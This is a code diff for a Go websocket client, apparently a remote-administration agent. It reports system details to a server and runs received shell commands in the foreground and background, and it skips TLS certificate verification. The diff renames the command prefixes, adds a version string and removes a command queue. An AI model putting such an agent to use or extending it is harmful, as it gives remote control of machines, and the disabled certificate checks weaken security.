@@ -22,9 +22,10 @@ import (
 
 // 常量定义
 const (
-	HOST               string = "127.0.0.1" // 服务器地址
-	PORT               int    = 8765        // 服务器端口
-	INSECURESKIPVERIFY bool   = true        // 跳过证书验证
+	HOST               string = "127.0.0.1"  // 服务器地址
+	PORT               int    = 8765         // 服务器端口
+	INSECURESKIPVERIFY bool   = true         // 跳过证书验证
+	VERSION            string = "3.0-beta.1" // 版本号，不要手动修改
 )
 
 // 获取系统信息
@@ -39,16 +40,17 @@ func get_system_info() string {
 		return "error"
 	}
 
-	// 获取操作系统名称，主机名，平台版本，内核版本，内核架构，处理器型号
+	// 获取操作系统名称，主机名，平台版本，内核版本，内核架构，处理器型号，产品版本
 	system := hostInfo.OS
 	node := hostInfo.Hostname
 	release := hostInfo.PlatformVersion
 	version := hostInfo.KernelVersion
 	machine := hostInfo.KernelArch
 	processor := cpuInfo[0].ModelName
+	product_version := VERSION
 
-	systemInfo := fmt.Sprintf("%s %s %s %s %s %s",
-		system, node, release, version, machine, processor)
+	systemInfo := fmt.Sprintf("%s %s %s %s %s %s VERSION:%s",
+		system, node, release, version, machine, processor, product_version)
 
 	return systemInfo
 }
@@ -100,7 +102,7 @@ func execute_command_main(command string, Executecommand *ExecuteCommand, conn *
 		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
 			conn.Close()
 		}
-	} else if strings.HasPrefix(command, "compress") {
+	} else if strings.HasPrefix(command, "compress:") {
 		// 压缩文件或文件夹
 		file_info := command[len("compress:"):]
 		file_info_list := strings.SplitN(file_info, "(*.*)", 2)
@@ -108,7 +110,7 @@ func execute_command_main(command string, Executecommand *ExecuteCommand, conn *
 		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
 			conn.Close()
 		}
-	} else if strings.HasPrefix(command, "extract") {
+	} else if strings.HasPrefix(command, "extract:") {
 		// 解压文件
 		file_info := command[len("extract:"):]
 		file_info_list := strings.SplitN(file_info, "(*.*)", 2)
@@ -119,16 +121,16 @@ func execute_command_main(command string, Executecommand *ExecuteCommand, conn *
 		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
 			conn.Close()
 		}
-	} else if strings.HasPrefix(command, "command:") {
+	} else if strings.HasPrefix(command, "cmd:") {
 		// 执行命令
-		command = command[len("command:"):]
+		command = command[len("cmd:"):]
 		output := Executecommand.execute_command(command)
 		if err := conn.WriteJSON(output); err != nil {
 			conn.Close()
 		}
-	} else if strings.HasPrefix(command, "background:") {
+	} else if strings.HasPrefix(command, "bg:") {
 		// 后台执行命令
-		command = command[len("background:"):]
+		command = command[len("bg:"):]
 		go Executecommand.execute_bg_command(command)
 		if err := conn.WriteMessage(websocket.TextMessage, []byte("ok")); err != nil {
 			conn.Close()
@@ -218,15 +220,7 @@ func client_loop() {
 			conn.Close()
 			continue
 		}
-
-		command_queue := make(chan string)
 		Executecommand := &ExecuteCommand{conn: conn}
-
-		go func() {
-			for command := range command_queue {
-				execute_command_main(command, Executecommand, conn)
-			}
-		}()
 
 		for {
 			_, message, err := conn.ReadMessage()
@@ -235,7 +229,7 @@ func client_loop() {
 				break
 			}
 			command := string(message)
-			command_queue <- command
+			execute_command_main(command, Executecommand, conn)
 		}
 	}
 }
